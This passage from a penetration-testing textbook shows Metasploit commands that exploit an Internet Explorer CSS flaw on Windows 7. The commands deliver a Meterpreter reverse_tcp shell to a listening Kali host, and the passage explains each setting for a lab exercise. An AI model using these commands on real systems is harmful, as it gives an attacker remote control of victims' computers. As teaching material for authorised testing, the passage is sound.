# Exploit Examples

As you learned previously in this chapter, you can search either online or in Metasploit for a number of exploits. I will show you just a few here as samples.

# Cascading Style Sheets

This attack is based on a flaw in how Internet Explorer running on Windows 7 handles and processes cascading style sheets. This attack has two parts. The first is done on the Kali machine:

```
use exploit/windows/browser/ms11_003_ie_css_import
set payload windows/meterpreter/reverse_tcp
set URIPATH /clickhere
set LHOST 10.0.2.20
exploit
```

Some of this looks just like the scans. You start with the **use** statement, just like scans. But then you have a second command, to set the payload. Basically, that means you are using a specific exploit, then setting the payload you wish to deliver to the target. The **URIPATH** will give a path after the IP address. Which brings us to the **LHOST**, which is short for listening host. The IP address is the IP address of your Kali machine. Then type **exploit**. Figure 13-15 shows this scan in action.

![](bbox=[0.07, 0.51, 0.72, 0.79])

FIGURE 13-15 CSS Exploit.

At this point, your Kali machine is a web server waiting for someone to connect to it. Now on the target machine, open Internet Explorer and navigate to http://10.0.2.20:8080/clickhere.